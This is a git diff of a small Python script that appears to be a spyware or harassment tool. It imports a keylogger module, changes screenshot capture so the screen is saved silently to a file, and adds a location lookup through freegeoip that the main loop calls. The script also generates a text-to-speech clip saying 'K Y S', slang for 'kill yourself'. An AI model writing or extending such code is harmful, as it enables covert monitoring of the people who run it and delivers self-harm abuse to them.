@@ -1,13 +1,19 @@
-import _thread, time, Keylogger, pygame, pyscreenshot
+import _thread, time, Keylogger, pygame, requests, json
 import os
-from pygame import image
-from tempfile import TemporaryFile
+from PIL import ImageGrab
 
 from gtts import gTTS
 
+#--------PRINT SCREEN--------
 def printScreen():
-    img = pyscreenshot.grab()
-    img.show()
+    ImageGrab.grab().save("screenshot.jpg", "JPEG")
+
+#--------RETURN JSON FILE WITH LOCATION DETAILS--------
+def getLocation():
+    send_url = 'http://freegeoip.net/json'
+    r = requests.get(send_url)
+    j = json.loads(r.text)
+    return j
 
 def timeTest(mod):
     ctr = 0
@@ -31,6 +37,8 @@ def play():
     while pygame.mixer.music.get_busy():
         continue
 
+
+#--------TEXT TO SPEECH--------
 def speak(x):
     text = gTTS(text= x, lang= 'en')
     with open("Speech.mp3", 'wb') as f:
@@ -47,7 +55,7 @@ def delete():
 def mainFunc():
     while True:
         choice = input()
-        printScreen()
+        getLocation()
 
 tts = gTTS(text='K Y S', lang='en')
 tts.save("Holder.mp3")
